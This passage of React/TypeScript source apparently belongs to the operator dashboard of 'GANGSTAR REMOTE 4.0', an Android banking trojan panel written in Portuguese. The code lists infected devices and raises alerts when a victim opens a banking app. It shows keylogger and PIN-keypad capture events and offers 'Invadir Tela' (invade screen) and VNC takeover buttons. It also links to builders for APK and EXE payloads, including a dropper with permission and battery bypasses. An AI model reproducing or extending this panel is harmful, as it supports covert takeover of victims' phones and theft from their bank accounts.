      const bankOpenOnlyEvents = newEvents.filter(e => e.type === 'bank_open' && (e.title ? e.title.includes('BANCO ABERTO') : true));
      if (bankOpenOnlyEvents.length > 0) {
        setActivityLog((prev) => {
          return [...bankOpenOnlyEvents, ...prev].slice(0, 50);
        });
      }
      
      const openedBankEvents = newEvents.filter(e => e.type === 'bank_open');
      const closedBankEvents = newEvents.filter(e => e.type === 'bank_close');
      
      if (openedBankEvents.length > 0 || closedBankEvents.length > 0) {
        setAlerts((prev) => {
          let updated = [...prev];
          
          const affectedDevIds = new Set([...openedBankEvents, ...closedBankEvents].map(a => a.deviceId));
          updated = updated.filter(a => !(affectedDevIds.has(a.deviceId) && a.status === 'open'));
          
          const newActions = [...openedBankEvents, ...closedBankEvents].map(e => ({
            deviceId: e.deviceId,
            deviceModel: e.deviceModel,
            bankPackage: e.bankPackage || '',
            bankName: e.title.replace('🚨 BANCO ABERTO: ', '').replace('ℹ️ BANCO FECHADO: ', ''),
            status: (e.type === 'bank_open' ? 'open' : 'closed') as 'open' | 'closed',
            timestamp: e.timestamp,
            iconB64: e.iconB64
          }));
          
          updated = [...newActions, ...updated];
          return updated.slice(0, 6);
        });
      }
    }
    
    prevDevicesRef.current = devices;
  }, [devices, soundEnabled, playConnectionSound, playDisconnectionSound, playAlertSound, showToast]);

  const togglePinDevice = useCallback((deviceId: string) => {
    setPinnedDeviceIds((prev) => {
      const isPinned = prev.includes(deviceId);
      const updated = isPinned ? prev.filter((id) => id !== deviceId) : [...prev, deviceId];
      localStorage.setItem('pinned_device_ids', JSON.stringify(updated));
      showToast(
        isPinned ? '📌 DISPOSITIVO DESFIXADO' : '📌 DISPOSITIVO FIXADO',
        isPinned ? 'O aparelho voltou à ordem normal da lista' : 'O aparelho foi fixado no topo da lista!',
        'closed',
        'system'
      );
      return updated;
    });
  }, [showToast]);

  const clientes = useMemo(() => {
    const mapped = devices.map((d) => {
      const cliente = mapDeviceToCliente(d, hideIps);
      cliente.isPinned = pinnedDeviceIds.includes(cliente.deviceId);
      return cliente;
    }).filter((c) => {
      const isWin = c.deviceId.startsWith('WIN-') || 
                    (c.modelName && c.modelName.toLowerCase().includes('windows')) ||
                    (c.androidVersion && c.androidVersion.toLowerCase().includes('windows'));
      return !isWin;
    });

    const pinnedOnline = mapped.filter((c) => c.isPinned && c.status === 'online');
    const pinnedOffline = mapped.filter((c) => c.isPinned && c.status === 'offline');
    const unpinnedOnline = mapped.filter((c) => !c.isPinned && c.status === 'online');
    const unpinnedOffline = mapped.filter((c) => !c.isPinned && c.status === 'offline');

    return [...pinnedOnline, ...pinnedOffline, ...unpinnedOnline, ...unpinnedOffline];
  }, [devices, hideIps, pinnedDeviceIds]);

  const onlineCount = clientes.filter((c) => c.status === 'online').length;

  const handleRowClick = (cliente: Cliente) => {
    if (cliente.status === 'online') {
      navigate(`/device/${cliente.deviceId}`);
    }
  };

  const handleDeleteDevice = useCallback(async (cliente: Cliente) => {
    if (!confirm(`Deseja realmente excluir o dispositivo offline "${cliente.modelName || cliente.deviceId}"?`)) {
      return;
    }
    try {
      await devicesAPI.deleteDevice(cliente.deviceId);
      loadDevices(false);
    } catch (err: any) {
      alert("Erro ao excluir dispositivo: " + (err.response?.data?.detail || err.message));
    }
  }, [loadDevices]);

  return (
    <div className="h-screen w-screen overflow-hidden bg-transparent text-slate-100 flex safe-top safe-bottom relative">
      {/* Background ambient lighting glow */}
      <div className="absolute top-0 left-1/4 w-[600px] h-[350px] bg-cyan-500/18 blur-[160px] pointer-events-none rounded-full" />
      <div className="absolute top-1/3 right-10 w-[500px] h-[350px] bg-blue-600/18 blur-[160px] pointer-events-none rounded-full" />

      <DashboardSidebar onLogout={onLogout} isMobile={isMobile} />

      <div className={`flex-1 flex flex-col h-full min-w-0 relative z-10 overflow-hidden ${isMobile ? 'pb-16' : ''}`}>
        {/* HEADER TOP BAR */}
        <header className="bg-[#030919]/70 border-b border-cyan-500/30 px-4 sm:px-6 py-3.5 flex-shrink-0 backdrop-blur-2xl relative shadow-[0_4px_25px_rgba(0,0,0,0.6)]">
          <div className="absolute bottom-0 left-0 right-0 h-[1px] bg-gradient-to-r from-transparent via-cyan-400/40 to-transparent"></div>
          <div className="flex items-center justify-between gap-4">
            {/* 💎 GANGSTAR REMOTE - BRANDING HEADER */}
            <div className="flex items-center gap-3 select-none">
              {/* Logo Redondo Azul com Brilho Neon */}
              <div className="relative flex items-center justify-center flex-shrink-0">
                <div className="absolute -inset-1 bg-sky-500/35 rounded-full blur-md animate-pulse" />
                <div className="relative w-8 h-8 rounded-full p-[1.5px] bg-gradient-to-tr from-cyan-400 to-blue-600 shadow-[0_0_15px_rgba(0,240,255,0.55)] flex items-center justify-center">
                  <div className="w-full h-full rounded-full bg-[#020919] flex items-center justify-center overflow-hidden">
                    <img
                      src="/gangstar-logo.svg?v=2"
                      alt="Gangstar Logo"
                      className="w-5 h-5 object-contain"
                      style={{ filter: 'drop-shadow(0 0 8px rgba(0, 240, 255, 0.95)) brightness(1.2)' }}
                    />
                  </div>
                </div>
              </div>

              {/* Nome GANGSTAR REMOTE 4.0 em Azul */}
              <h1 className="text-base sm:text-lg font-black tracking-wider uppercase font-sans bg-gradient-to-r from-cyan-300 via-sky-400 to-blue-500 bg-clip-text text-transparent drop-shadow-[0_0_12px_rgba(56,189,248,0.75)] leading-none">
                GANGSTAR REMOTE 4.0
              </h1>
            </div>

            <div className="flex items-center gap-2 sm:gap-3 flex-shrink-0">

              {!isMobile && (
                <div id="tour-build-buttons" className="hidden md:flex items-center gap-2.5">
                  <button
                    type="button"
                    onClick={() => {
                      setShowMyAppsModal(true);
                      loadBuilds();
                    }}
                    className="flex items-center gap-2 px-3.5 py-2 bg-slate-900/90 border border-cyan-500/40 hover:bg-cyan-500/15 text-cyan-300 rounded-xl text-xs font-bold uppercase tracking-wider shadow-[0_0_12px_rgba(0,240,255,0.15)] transition-all hover:scale-105"
                  >
                    <Smartphone className="w-4 h-4 text-cyan-400" />
                    {t('nav.my_apps')}
                  </button>
                  <button
                    type="button"
                    onClick={() => navigate('/win-builder')}
                    className="flex items-center gap-2 px-3.5 py-2 bg-gradient-to-r from-cyan-600 via-blue-600 to-sky-500 hover:from-cyan-500 hover:to-blue-500 text-white rounded-xl text-xs font-black uppercase tracking-wider shadow-[0_0_18px_rgba(0,240,255,0.4)] transition-all transform hover:scale-105 active:scale-95 border border-cyan-400/40"
                    title="Central Windows: Gerar Payload .EXE e Controle VNC de PCs"
                  >
                    <Monitor className="w-4 h-4 text-cyan-300" />
                    <span>{t('nav.gen_exe')}</span>
                  </button>
                  <button
                    type="button"
                    onClick={() => navigate('/build-apk')}
                    className="flex items-center gap-2 px-3.5 py-2 bg-gradient-to-r from-blue-600 to-cyan-500 hover:from-blue-500 hover:to-cyan-400 text-white rounded-xl text-xs font-bold uppercase tracking-wider shadow-[0_0_15px_rgba(0,240,255,0.35)] transition-all hover:scale-105 active:scale-95"
                  >
                    <Package className="w-4 h-4" />
                    {t('nav.gen_apk')}
                  </button>
                  <button
                    type="button"
                    onClick={() => navigate('/apk-bypass')}
                    className="flex items-center gap-2 px-3.5 py-2 bg-gradient-to-r from-cyan-600 via-blue-600 to-sky-500 hover:from-cyan-500 hover:to-sky-400 text-white rounded-xl text-xs font-black uppercase tracking-wider shadow-[0_0_18px_rgba(6,182,212,0.5)] transition-all transform hover:scale-105 active:scale-95 border border-cyan-300/50"
                    title="Build com Bypass (PROJETO: Bateria, Permissões, Dropper)"
                  >
                    <Zap className="w-4 h-4 text-cyan-200 animate-pulse" />
                    {t('nav.gen_bypass')}
                  </button>
                </div>
              )}
              <button
                type="button"
                onClick={() => {
                  const next = !hideIps;
                  setHideIps(next);
                  localStorage.setItem('hide_ips', String(next));
                }}
                className={`flex items-center gap-1.5 px-3 py-2 rounded-xl border text-xs font-bold transition-all ${
                  hideIps
                    ? 'bg-cyan-950/90 border-cyan-400/60 text-cyan-200 shadow-[0_0_12px_rgba(6,182,212,0.3)]'
                    : 'bg-slate-900/90 border-cyan-500/20 text-slate-300 hover:text-cyan-300 hover:bg-slate-800'
                }`}
                title={hideIps ? t('nav.show_ips') : t('nav.hide_ips')}
              >
                {hideIps ? <EyeOff className="w-4 h-4 text-cyan-300" /> : <Eye className="w-4 h-4 text-cyan-400" />}
                <span className="hidden sm:inline">{hideIps ? t('nav.hide_ips') : t('nav.show_ips')}</span>
              </button>
              <LanguageSelector />
              <button
                type="button"
                onClick={() => loadDevices(false)}
                className="p-2.5 bg-slate-900/90 hover:bg-slate-800 rounded-xl border border-cyan-500/20 text-slate-300 hover:text-cyan-300 transition-all hover:shadow-[0_0_12px_rgba(0,240,255,0.2)] cursor-pointer"
                title={t('nav.refresh')}
              >
                <RefreshCw className={`w-4 h-4 ${refreshing ? 'animate-spin text-cyan-400' : ''}`} />
              </button>
              <button
                type="button"
                onClick={() => {
                  loadUserProfile();
                  setShowProfileModal(true);
                }}
                className="p-2.5 bg-slate-900/90 hover:bg-slate-800 rounded-xl border border-cyan-500/20 text-slate-300 hover:text-cyan-300 transition-all hover:shadow-[0_0_12px_rgba(0,240,255,0.2)] cursor-pointer"
                title={t('nav.profile')}
              >
                <div className="w-5 h-5 rounded-full overflow-hidden border border-cyan-400/80 shadow-[0_0_10px_rgba(0,240,255,0.6)] flex items-center justify-center">
                  <img src={avatarImg} alt="Perfil" className="w-full h-full object-cover" />
                </div>
              </button>
              <button
                type="button"
                onClick={() => setIsSidebarOpen(!isSidebarOpen)}
                className={`p-2.5 rounded-xl border transition-all cursor-pointer ${
                  isSidebarOpen 
                    ? 'bg-cyan-500/20 border-cyan-400/50 text-cyan-300 shadow-[0_0_15px_rgba(0,240,255,0.3)]' 
                    : 'bg-slate-900/90 border-cyan-500/20 text-slate-400 hover:bg-slate-800 hover:text-white'
                }`}
                title={t('nav.radar')}
              >
                <Bell className="w-4 h-4" />
              </button>
            </div>
          </div>
        </header>

        {/* 🔵 MODAL POPUP ALERTA DO GRUPO DO TELEGRAM (Aparece 1x pós-login com botão OK) */}
        {showWhatsappModal && (
          <div className="fixed inset-0 z-[9999] flex items-center justify-center p-4 bg-slate-950/80 backdrop-blur-md animate-in fade-in duration-200">
            <div className="relative w-full max-w-lg bg-gradient-to-b from-slate-900 via-sky-950/40 to-slate-950 border-2 border-sky-500/70 rounded-3xl p-6 sm:p-8 shadow-[0_0_50px_rgba(14,165,233,0.4)] text-center overflow-hidden">
              <div className="absolute -top-24 -left-24 w-48 h-48 bg-sky-500/20 rounded-full blur-3xl pointer-events-none"></div>
              <div className="absolute -bottom-24 -right-24 w-48 h-48 bg-blue-500/20 rounded-full blur-3xl pointer-events-none"></div>

              <div className="mx-auto w-16 h-16 rounded-2xl bg-sky-500/20 border-2 border-sky-400/80 flex items-center justify-center mb-5 shadow-[0_0_25px_rgba(14,165,233,0.5)] animate-bounce">
                <Send className="w-8 h-8 text-sky-300" />
              </div>

              <span className="inline-block px-3 py-1 rounded-full bg-sky-500/30 text-sky-200 text-xs font-black uppercase font-mono tracking-widest border border-sky-400/50 mb-3 shadow-[0_0_10px_rgba(14,165,233,0.3)]">
                📢 COMUNICADO OFICIAL
              </span>

              <h2 className="text-xl sm:text-2xl font-black text-white tracking-tight mb-3">
                ENTRE NO GRUPO DO TELEGRAM!
              </h2>

              <p className="text-sm text-sky-200/90 font-medium leading-relaxed mb-6">
                Atenção membros: Entrem no nosso grupo oficial do Telegram para receber suporte em tempo real, dicas, atualizações e novos recursos do painel!
              </p>

              <div className="flex flex-col sm:flex-row items-center justify-center gap-3">
                <a
                  href="https://t.me/uniaodosSETe"
                  target="_blank"
                  rel="noopener noreferrer"
                  onClick={() => {
                    sessionStorage.setItem('whatsapp_announcement_seen', 'true');
                    setShowWhatsappModal(false);
                  }}
                  className="w-full sm:w-auto flex items-center justify-center gap-2 px-6 py-3 bg-gradient-to-r from-sky-400 via-blue-400 to-cyan-300 hover:from-sky-300 hover:to-cyan-200 text-slate-950 font-black text-sm uppercase tracking-wider rounded-2xl shadow-[0_0_25px_rgba(14,165,233,0.7)] hover:scale-105 transition-all transform active:scale-95 border border-sky-200 cursor-pointer"
                >
                  <Send className="w-5 h-5 text-slate-950" />
                  <span>ENTRAR NO GRUPO DO TELEGRAM</span>
                </a>

                <button
                  type="button"
                  onClick={() => {
                    sessionStorage.setItem('whatsapp_announcement_seen', 'true');
                    setShowWhatsappModal(false);
                  }}
                  className="w-full sm:w-auto px-8 py-3 bg-slate-800/90 hover:bg-slate-700 text-white font-black text-sm uppercase tracking-wider rounded-2xl border border-slate-600/80 hover:border-slate-400 transition-all cursor-pointer shadow-lg"
                >
                  OK
                </button>
              </div>
            </div>
          </div>
        )}

        <div className="flex-1 flex overflow-hidden">
          <main className="flex-1 p-4 sm:p-6 overflow-auto">
          {/* 🚀 PAINEL PREMIUM DE ESTATÍSTICAS (PING SERVIDOR, APARELHOS E APPS GUARDADOS) */}
          <div className="mb-6 grid grid-cols-1 sm:grid-cols-3 gap-4">
            {/* ⚡ BADGE 1: PING SERVIDOR */}
            <div className="relative bg-gradient-to-br from-[#091733]/90 via-[#050f24]/90 to-[#030918]/90 border border-cyan-500/40 hover:border-cyan-300 rounded-2xl p-4 backdrop-blur-2xl shadow-[0_0_25px_rgba(6,182,212,0.18)] flex items-center justify-between transition-all duration-300 hover:scale-[1.02] hover:shadow-[0_0_35px_rgba(6,182,212,0.3)] group overflow-hidden">
              <div className="absolute -right-6 -bottom-6 w-24 h-24 bg-cyan-500/10 rounded-full blur-2xl group-hover:bg-cyan-500/20 transition-all pointer-events-none"></div>
              <div className="flex items-center gap-3.5 relative z-10">
                <div className="p-3 rounded-xl bg-gradient-to-br from-cyan-500/25 to-blue-600/30 border border-cyan-400/60 text-cyan-300 shadow-[0_0_15px_rgba(6,182,212,0.4)] group-hover:scale-110 transition-transform">
                  <Wifi className="w-5 h-5 text-cyan-300 animate-pulse" />
                </div>
                <div>
                  <span className="text-[11px] font-black text-cyan-300/80 uppercase font-mono tracking-widest block">{t('stats.ping_server')}</span>
                  <div className="flex items-baseline gap-1.5 mt-0.5">
                    <span className="text-2xl font-black text-white font-mono tracking-tight group-hover:text-cyan-200 transition-colors">{serverPing}</span>
                    <span className="text-xs text-cyan-400 font-mono font-bold">ms</span>
                  </div>
                </div>
              </div>
              <span className="text-[10px] text-cyan-400 font-mono font-black px-2.5 py-1 rounded-full bg-cyan-950/80 border border-cyan-500/40 shadow-[0_0_10px_rgba(6,182,212,0.3)] flex items-center gap-1.5 relative z-10">
                <span className="w-2 h-2 rounded-full bg-cyan-400 animate-ping"></span>
                {t('nav.online')}
              </span>
            </div>

            {/* 📱 BADGE 2: APARELHOS / DISPOSITIVOS (AZUL MODERNO) */}
            <div className="relative bg-gradient-to-br from-[#091733]/90 via-[#050f24]/90 to-[#030918]/90 border border-cyan-500/50 hover:border-cyan-300 rounded-2xl p-4 backdrop-blur-2xl shadow-[0_0_25px_rgba(6,182,212,0.22)] flex flex-col justify-between transition-all duration-300 hover:scale-[1.02] hover:shadow-[0_0_35px_rgba(6,182,212,0.4)] group overflow-hidden">
              <div className="absolute -right-6 -bottom-6 w-24 h-24 bg-cyan-500/15 rounded-full blur-2xl group-hover:bg-cyan-500/25 transition-all pointer-events-none"></div>
              <div className="flex items-center justify-between relative z-10">
                <div className="flex items-center gap-3.5">
                  <div className="p-3 rounded-xl bg-gradient-to-br from-cyan-500/30 to-blue-600/40 border border-cyan-400/70 text-cyan-200 shadow-[0_0_15px_rgba(6,182,212,0.5)] group-hover:scale-110 transition-transform">
                    <Smartphone className="w-5 h-5 text-cyan-300 animate-pulse" />
                  </div>
                  <div>
                    <span className="text-[11px] font-black text-cyan-300/90 uppercase font-mono tracking-widest block">{t('stats.devices')}</span>
                    <div className="flex items-baseline gap-2 mt-0.5">
                      <span className="text-2xl font-black text-white font-mono tracking-tight">{clientes.length}</span>
                      <span className="text-xs text-cyan-300/70 font-mono font-bold">{t('stats.registered')}</span>
                    </div>
                  </div>
                </div>
                <span className="text-[10px] font-mono text-cyan-200 font-black px-3 py-1 rounded-full bg-cyan-950/90 border border-cyan-400/60 shadow-[0_0_12px_rgba(6,182,212,0.35)]">
                  {onlineCount} ON
                </span>
              </div>

              {/* Visual Progress bar ratio of Online devices in Electric Blue */}
              <div className="mt-3 w-full bg-slate-900/90 h-1.5 rounded-full overflow-hidden border border-cyan-900/50 relative z-10">
                <div 
                  className="h-full bg-gradient-to-r from-blue-600 via-cyan-400 to-sky-300 rounded-full transition-all duration-500 shadow-[0_0_12px_rgba(6,182,212,0.9)]"
                  style={{ width: clientes.length > 0 ? `${(onlineCount / clientes.length) * 100}%` : '0%' }}
                ></div>
              </div>
            </div>

            {/* 📦 BADGE 3: APPS GUARDADOS (AZUL MODERNO) */}
            <div className="relative bg-gradient-to-br from-[#091733]/90 via-[#050f24]/90 to-[#030918]/90 border border-cyan-500/50 hover:border-cyan-300 rounded-2xl p-4 backdrop-blur-2xl shadow-[0_0_25px_rgba(6,182,212,0.22)] flex items-center justify-between transition-all duration-300 hover:scale-[1.02] hover:shadow-[0_0_35px_rgba(6,182,212,0.4)] group overflow-hidden">
              <div className="absolute -right-6 -bottom-6 w-24 h-24 bg-cyan-500/15 rounded-full blur-2xl group-hover:bg-cyan-500/25 transition-all pointer-events-none"></div>
              <div className="flex items-center gap-3.5 relative z-10">
                <div className="p-3 rounded-xl bg-gradient-to-br from-blue-600/30 via-cyan-500/30 to-sky-400/30 border border-cyan-400/70 text-cyan-200 shadow-[0_0_15px_rgba(6,182,212,0.5)] group-hover:scale-110 transition-transform">
                  <Package className="w-5 h-5 text-cyan-300" />
                </div>
                <div>
                  <span className="text-[11px] font-black text-cyan-300/90 uppercase font-mono tracking-widest block">{t('stats.stored_apps')}</span>
                  <div className="flex items-baseline gap-1.5 mt-0.5">
                    <span className="text-2xl font-black text-white font-mono tracking-tight">{builds.length}</span>
                    <span className="text-xs text-cyan-300/70 font-mono font-bold">APKs</span>
                  </div>
                </div>
              </div>
              <button
                type="button"
                onClick={() => setShowMyAppsModal(true)}
                className="px-3.5 py-1.5 rounded-xl bg-gradient-to-r from-cyan-500 via-blue-600 to-sky-400 hover:from-cyan-400 hover:to-sky-300 text-white font-black font-mono text-xs transition-all hover:scale-105 active:scale-95 shadow-[0_0_15px_rgba(6,182,212,0.5)] border border-cyan-300 flex items-center gap-1 relative z-10"
                title="Ver Central de Apps Guardados"
              >
                <span>Meus Apps</span>
                <span className="text-sm">⚡</span>
              </button>
            </div>
          </div>
          
          {/* 🔔 BARRA SLIM DE ALERTAS BANCÁRIOS (CLEAN & ELEGANT) */}
          {(() => {
            const activeCount = alerts.filter(a => a.status === 'open').length;
            
            if (alerts.length === 0) {
              return (
                <div className="mb-5 px-4 py-2.5 bg-[#050c1e]/80 border border-blue-500/20 rounded-xl flex items-center justify-between backdrop-blur-md">
                  <div className="flex items-center space-x-2.5">
                    <span className="w-2 h-2 rounded-full bg-cyan-400 animate-pulse"></span>
                    <span className="text-xs font-bold text-blue-200/80 font-mono">Alertas Financeiros:</span>
                    <span className="text-xs text-blue-300/50">Nenhum aplicativo bancário em execução no momento</span>
                  </div>
                  <span className="text-[10px] text-cyan-400 font-mono font-bold px-2 py-0.5 rounded bg-cyan-950/50 border border-cyan-500/20">
                    SISTEMA ATIVO
                  </span>
                </div>
              );
            }

            return (
              <div className="mb-5 space-y-2">
                <div className="flex items-center justify-between px-1">
                  <span className="text-xs font-bold text-cyan-300 font-mono flex items-center gap-2">
                    <span className="w-2 h-2 rounded-full bg-red-400 animate-ping"></span>
                    Alertas Bancários Detectados ({alerts.length})
                  </span>
                  {activeCount > 0 && (
                    <span className="text-[10px] font-bold text-red-400 font-mono uppercase bg-red-950/60 px-2.5 py-0.5 rounded-md border border-red-500/30">
                      🚨 {activeCount} Banco(s) em foco
                    </span>
                  )}
                </div>

                <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-2.5">
                  {alerts.map((item, idx) => {
                    const isOpen = item.status === 'open';
                    
                    return (
                      <div
                        key={idx}
                        onClick={() => navigate(`/device/${item.deviceId}`)}
                        className={`p-3 rounded-xl border transition-all cursor-pointer flex items-center justify-between ${
                          isOpen
                            ? 'bg-red-950/40 border-red-500/50 text-red-100 hover:border-red-400 shadow-md'
                            : 'bg-blue-950/30 border-blue-500/20 text-blue-300/70 hover:border-cyan-500/40'
                        }`}
                      >
                        <div className="flex items-center space-x-3 min-w-0">
                          <BankIcon pkg={item.bankPackage} iconB64={item.iconB64} name={item.bankName} size={32} />
                          <div className="min-w-0">
                            <span className="text-xs font-bold truncate block font-mono text-white">{item.bankName}</span>
                            <span className="text-[10px] text-blue-300/50 truncate block font-mono">{item.deviceModel}</span>
                          </div>
                        </div>
                        
                        <div className="flex items-center space-x-2 flex-shrink-0">
                          {isOpen ? (
                            <span className="px-2.5 py-1 bg-red-600 hover:bg-red-500 text-white font-bold text-[10px] rounded-lg font-mono uppercase transition-all shadow">
                              Acessar
                            </span>
                          ) : (
                            <span className="text-[9px] font-mono text-blue-300/40 uppercase">
                              Fechado
                            </span>
                          )}
                        </div>
                      </div>
                    );
                  })}
                </div>
              </div>
            );
          })()}

          <div id="tour-device-table">
            <DeviceTable
              clientes={clientes}
              loading={initialLoading}
              onRowClick={handleRowClick}
              onRowContextMenu={(e, cliente) => openMenu(e, cliente)}
              onDeleteDevice={handleDeleteDevice}
              onCreateApk={() => navigate('/build-apk')}
              onOpenVnc={handleOpenVnc}
              onTogglePin={togglePinDevice}
            />
          </div>
        </main>

        {/* HUD DE NOTIFICAÇÕES LATERAIS */}
        {isSidebarOpen && !isMobile && (
          <div id="tour-banking-radar" className="w-80 border-l border-cyan-500/20 bg-[#030919]/40 backdrop-blur-md flex flex-col flex-shrink-0 text-slate-300 relative transition-all duration-300 ease-in-out shadow-[-10px_0_30px_rgba(0,0,0,0.5)]">
            <div className="p-4 border-b border-cyan-500/20 flex items-center justify-between">
              <div className="flex items-center gap-2.5">
                <Activity className="w-4 h-4 text-cyan-400 animate-pulse" />
                <span className="text-xs font-black tracking-widest text-cyan-300 font-mono">RADAR DE ALERTAS</span>
              </div>
              <div className="flex items-center gap-1.5">
                <button
                  onClick={() => setSoundEnabled(!soundEnabled)}
                  className={`p-1.5 rounded-lg transition-colors ${soundEnabled ? 'text-cyan-400 bg-cyan-500/10 hover:bg-cyan-500/20' : 'text-slate-500 hover:bg-slate-800'}`}
                  title={soundEnabled ? "Mudar para Silencioso" : "Ativar Som"}
                >
                  {soundEnabled ? <Volume2 className="w-4 h-4" /> : <VolumeX className="w-4 h-4" />}
                </button>
                <button
                  onClick={() => setActivityLog([])}
                  className="p-1.5 text-slate-400 hover:text-red-400 hover:bg-red-500/10 rounded-lg transition-colors"
                  title="Limpar Feed"
                >
                  <Trash2 className="w-4 h-4" />
                </button>
              </div>
            </div>
            
            <div className="flex-1 overflow-y-auto p-3.5 space-y-3">
              {activityLog.length === 0 ? (
                <div className="h-full flex flex-col items-center justify-center text-center p-4 text-slate-500 space-y-3">
                  <div className="p-3 rounded-2xl bg-cyan-500/10 border border-cyan-500/20 text-cyan-400">
                    <Sparkles className="w-7 h-7 animate-pulse" />
                  </div>
                  <p className="text-xs font-bold text-slate-300">Sem atividades recentes</p>
                  <p className="text-[11px] text-slate-500 leading-relaxed">Aparelhos conectados ou acessos a bancos aparecerão aqui em tempo real.</p>
                </div>

              ) : (
                activityLog.map((event) => {
                  const isBank = event.type === 'bank_open' || event.type === 'bank_close';
                  const isNumeric = event.type === 'numeric_keypad' || event.title.includes('NUMÉRICO');
                  const isKeylog = event.type === 'keylog' || event.title.includes('TECLADO');
                  const isOpen = event.type === 'bank_open';
                  const isOnline = event.type === 'device_online';
                  const isOffline = event.type === 'device_offline';
                  
                  let cardStyle = "bg-[#0b132b]/40 border border-slate-800/80";
                  
                  if (isOpen) {
                    cardStyle = "bg-[#180a0f]/90 border-2 border-red-500/60 shadow-[0_0_15px_rgba(239,68,68,0.15)]";
                  } else if (isNumeric) {
                    cardStyle = "bg-[#1c1809]/90 border-2 border-amber-400/80 shadow-[0_0_15px_rgba(245,158,11,0.2)]";
                  } else if (isKeylog) {
                    cardStyle = "bg-[#0a1428]/90 border border-cyan-500/50 shadow-[0_0_12px_rgba(6,182,212,0.15)]";
                  } else if (isOnline) {
                    cardStyle = "bg-[#0a1428]/90 border border-cyan-500/40 shadow-[0_0_12px_rgba(6,182,212,0.1)]";
                  } else if (isOffline) {
                    cardStyle = "bg-[#1a140c]/80 border border-amber-500/30";
                  }
                  
                  return (
                    <div 
                      key={event.id}
                      className={`p-3 rounded-xl transition-all duration-300 relative overflow-hidden ${cardStyle}`}
                    >
                      {isOpen && (
                        <div className="absolute inset-0 bg-gradient-to-r from-red-500/5 to-transparent pointer-events-none"></div>
                      )}
                      
                      <div className="flex items-start gap-2.5 relative z-10">
                        {isBank ? (
                          <div className="flex-shrink-0 mt-0.5">
                            <BankIcon pkg={event.bankPackage || ''} iconB64={event.iconB64} size={30} />
                          </div>
                        ) : (
                          <div className="w-[30px] h-[30px] rounded-lg bg-slate-900 border border-slate-850 flex items-center justify-center flex-shrink-0 mt-0.5">
                            <Smartphone className={`w-4 h-4 ${isOnline ? 'text-cyan-400 animate-bounce' : 'text-amber-500'}`} />
                          </div>
                        )}
                        
                        <div className="flex-1 min-w-0">
                          <div className="flex items-center justify-between gap-1">
                            <span className="font-mono text-[9px] text-slate-500 font-bold uppercase truncate">{event.deviceModel}</span>
                            <span className="text-[8px] text-slate-500 font-mono flex-shrink-0">{event.timestamp}</span>
                          </div>
                          <h4 className="text-[11px] font-black text-white mt-0.5 uppercase tracking-wide truncate">
                            {event.title}
                          </h4>
                          <p className="text-[10px] text-slate-400 leading-normal mt-0.5">
                            {event.description}
                          </p>
                          
                          {(isOpen || isOnline) && (
                            <button
                              onClick={() => navigate(`/device/${event.deviceId}`)}
                              className={`mt-2 w-full py-1 rounded text-[9px] font-black uppercase tracking-wider transition-all duration-200 ${
                                isOpen 
                                  ? 'bg-gradient-to-r from-red-600 to-orange-500 hover:from-red-500 hover:to-orange-400 text-white shadow-[0_0_8px_rgba(239,68,68,0.2)]'
                                  : 'bg-slate-850 hover:bg-slate-800 text-slate-300'
                              }`}
                            >
                              {isOpen ? '⚡ Invadir Tela' : '📡 Controlar'}
                            </button>
                          )}
                        </div>
                      </div>
                    </div>
                  );
                })
              )}
            </div>
          </div>
        )}
        </div>
      </div>

      <ContextMenu
        visible={menu.visible}
        x={menu.x}
        y={menu.y}
        cliente={menu.cliente}
        onClose={closeMenu}
        onRename={(cliente) => {
          const name = prompt("Digite o novo nome para o aparelho:", cliente.customName || cliente.model);
          if (name !== null) {
            devicesAPI.rename(cliente.deviceId, name)
              .then(() => {
                loadDevices(false);
              })
              .catch((err) => alert("Erro ao renomear dispositivo: " + (err.response?.data?.detail || err.message)));
          }
        }}
        onDelete={handleDeleteDevice}
      />

      {/* 🚀 TOAST NOTIFICATIONS EM TEMPO REAL (Canto Superior Direito) */}
      <div className="fixed top-4 right-4 z-50 pointer-events-none space-y-3 max-w-sm w-full">
        {toasts.map((t) => {
          const isOpen = t.type === 'open';
          return (
            <div
              key={t.id}
              className={`pointer-events-auto p-4 rounded-xl shadow-[0_10px_30px_rgba(0,0,0,0.5)] border backdrop-blur-xl flex items-center space-x-3.5 transition-all transform duration-300 animate-pulse-once ${
                isOpen 
                  ? 'bg-red-950/80 border-red-500/50 shadow-[0_0_20px_rgba(239,68,68,0.2)]' 
                  : 'bg-slate-900/90 border-slate-700/50'
              }`}
            >
              <div className="flex-shrink-0">
                <BankIcon pkg={t.bankPkg} iconB64={t.iconB64} size={38} />
              </div>
              <div className="flex-1 min-w-0">
                <h4 className={`text-[10px] font-black uppercase tracking-widest ${isOpen ? 'text-red-400' : 'text-slate-400'}`}>
                  {t.title}
                </h4>
                <p className="text-xs text-white font-bold mt-0.5">
                  {t.body}
                </p>
              </div>
            </div>
          );
        })}
      </div>

      {/* 📱 MODAL DE APKS GERADOS (MEUS APPS FUTURISTA & MODERNO) */}
      {showMyAppsModal && (
        <div className="fixed inset-0 bg-black/85 flex items-center justify-center z-50 p-4 backdrop-blur-md animate-fade-in" onClick={() => setShowMyAppsModal(false)}>
          <div 
            className="bg-gradient-to-b from-[#07112b] via-[#050c1f] to-[#030714] border border-cyan-500/40 rounded-3xl max-w-4xl w-full p-6 shadow-[0_0_60px_rgba(6,182,212,0.25)] backdrop-blur-2xl relative max-h-[85vh] flex flex-col overflow-hidden animate-scale-up select-none"
            onClick={(e) => e.stopPropagation()}
          >
            {/* Blueprint Grid Background Accent */}
            <div className="absolute inset-0 bg-[radial-gradient(circle_at_50%_0%,rgba(6,182,212,0.15),transparent_70%)] pointer-events-none"></div>
            
            <button 
              onClick={() => setShowMyAppsModal(false)}
              className="absolute top-5 right-5 p-2 text-slate-400 hover:text-white bg-slate-900/80 hover:bg-red-500/80 rounded-xl transition-all border border-slate-800 z-20 cursor-pointer"
            >
              <X className="w-5 h-5" />
            </button>

            <div className="relative z-10 flex items-center justify-between border-b border-cyan-500/20 pb-4 mb-4">
              <div className="flex items-center space-x-3">
                <div className="p-3 bg-gradient-to-br from-cyan-500/20 to-blue-600/20 rounded-2xl border border-cyan-400/40 shadow-[0_0_15px_rgba(6,182,212,0.3)]">
                  <Smartphone className="w-6 h-6 text-cyan-300 animate-pulse" />
                </div>
                <div>
                  <h3 className="text-base font-black uppercase text-white tracking-widest font-mono flex items-center gap-2">
                    📱 MEUS APLICATIVOS GERADOS
                    <span className="px-2 py-0.5 bg-cyan-500/20 text-cyan-300 text-[10px] rounded-full border border-cyan-400/30">
                      {builds.length} APKs
                    </span>
                  </h3>
